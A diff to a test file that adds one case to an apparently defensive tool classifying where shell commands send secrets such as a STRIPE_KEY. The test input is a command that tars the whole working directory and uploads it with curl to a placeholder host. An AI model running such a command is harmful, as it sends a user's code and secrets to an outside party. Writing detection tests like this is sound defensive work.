@@ -134,6 +134,13 @@ describe('a command that does send is still read', () => {
       });
   });
 
+  it('`--source` and a `source` in a name are no `source` command', () => {
+    const got = places('/Users/me/dev/app-a', [
+      `tar czf - . | curl -s -T - ${UP}; gh pr list --source x`,
+    ]);
+    expect(got.get('STRIPE_KEY')).toMatchObject({ tier: 'third_party' });
+  });
+
   it('git push and git fetch are what they are: a key given to one is sent', () => {
     expect(
       places('/Users/me/dev/app-a', [
